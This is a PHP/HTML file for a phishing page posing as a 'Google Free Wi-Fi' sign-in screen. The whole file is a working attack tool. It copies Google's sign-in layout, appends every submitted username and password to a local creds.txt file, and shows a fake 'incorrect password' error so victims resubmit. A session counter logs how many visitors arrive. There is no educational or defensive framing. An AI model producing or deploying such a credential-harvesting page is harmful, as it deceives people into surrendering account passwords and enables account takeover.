<?php
$err = "";
if (!empty($_POST)) {
  $user = $_POST['username'];
  $pass = $_POST['password'];
  file_put_contents('creds.txt',"$user $pass\n",FILE_APPEND);
  $err = "Incorrect username/password. Try again.";
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=394">
<title>Sign In - Google Free Wi-Fi</title>
<link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<form novalidate action="index.php" method="post">
	<img src="google_logo.gif" alt="">
	<h1>Sign in</h1>
	<h2>with your Google Account</h2>
	<input id="user" type="text" name="username" placeholder="Enter your email">
	<input type="password" name="password" placeholder="Enter your password">
	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
</form>
<footer>
	English (United States) <img src="caret.gif" alt="">
	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
</footer>
<script>document.onload = function() { document.getElementById("user").focus();};</script>

<?php
session_start();
$counter_name = "counter.txt";

// Check if a text file exists.
// If not create one and initialize it to zero.
if (!file_exists($counter_name)) {
  $f = fopen($counter_name, "w");
  fwrite($f,"0");
  fclose($f);
}

// Read the current value of our counter file
$f = fopen($counter_name,"r");
$counterVal = fread($f, filesize($counter_name));
fclose($f);

// Has visitor been counted in this session?
// If not, increase counter value by one
if(!isset($_SESSION['hasVisited'])){
  $_SESSION['hasVisited']="yes";
  $counterVal++;
  $f = fopen($counter_name, "w");
  fwrite($f, $counterVal);
  fclose($f);
}

?>

</body>
</html>
